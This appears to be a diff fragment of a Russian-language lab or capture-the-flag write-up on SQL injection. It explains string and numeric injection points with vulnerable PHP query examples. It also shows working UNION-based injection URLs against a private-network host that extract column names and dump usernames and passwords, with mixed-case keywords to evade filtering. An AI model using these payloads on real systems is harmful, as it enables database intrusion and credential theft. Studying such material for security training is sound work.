@@ -1,3 +1,16 @@
+SQL Injection
+Выделяют два вида SQL Injection
+• SQL Injection в строковом параметре
+Примеры:
+SELECT * from table where name = "$_GET['name']"
+SELECT id, acl from table where user_agent =
+'$_SERVER["HTTP_USER_AGENT"]'
+
+• SQL Injection в цифровом параметре
+Примеры:
+SELECT login, name from table where id = $_COOKIE["id"]
+SELECT id, news from table where news = 123 limit $_POST["limit"]
+----------------------------------------------------------------------------------------------------------------
 Изучаем site
 
 После внимательного изучения страниц сайта, определяем что он, видимо, написан разработчиками компании GDS, 
@@ -35,3 +48,4 @@ http://192.168.101.9:443/post.php?id=-1') UNiOn seLeCT 1, GrouP_CONcaT(ColUmN_nA
 
 http://192.168.101.9:443/post.php?id=-1') UNiOn alL (seLeCT usErNAme, pAssWoRd FroM users liMIT 0,1) -- -
 --------------------------------------------------------------------------------------------------------------
+
